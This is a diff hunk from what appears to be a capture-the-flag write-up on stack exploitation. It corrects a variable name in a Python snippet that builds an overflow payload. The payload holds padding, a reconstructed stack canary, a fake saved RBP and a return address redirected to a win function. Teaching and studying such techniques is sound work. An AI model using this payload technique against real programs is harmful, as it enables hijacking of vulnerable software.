@@ -55,7 +55,7 @@ Now you reconstructed full 8-byte canary
 
 Now the actual exploit. You rebuild the stack correctly:
 ```python
-attack_payload = b"A" * 72      # buffer
+payload = b"A" * 72             # buffer
 payload += p64(canary)          # correct canary
 payload += b"B"*8               # saved RBP
 payload += p64(win_addr)        # RIP → win
